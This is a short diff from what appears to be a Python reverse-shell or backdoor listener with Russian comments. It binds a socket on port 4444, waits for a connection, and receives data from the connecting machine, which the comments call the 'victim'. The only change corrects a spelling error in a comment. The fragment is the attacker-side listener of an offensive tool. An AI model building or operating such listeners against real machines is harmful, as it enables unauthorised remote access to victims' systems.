@@ -5,7 +5,7 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listener.bind(("enter ip", 4444))  # привязываем ip и порт
 listener.listen()  # прослушиваем порт
 print("[+]Waiting for connection...\n")
-connection, address = listener.accept()  # как только подключение установленно, получаем адресс жертвы и подключение
+connection, address = listener.accept()  # как только подключение установленно, получаем адрес жертвы и подключение
 print("[+]Connected to " + address[0] + "\n")
 while True:
     data = connection.recv(1024)  # получаем ответ
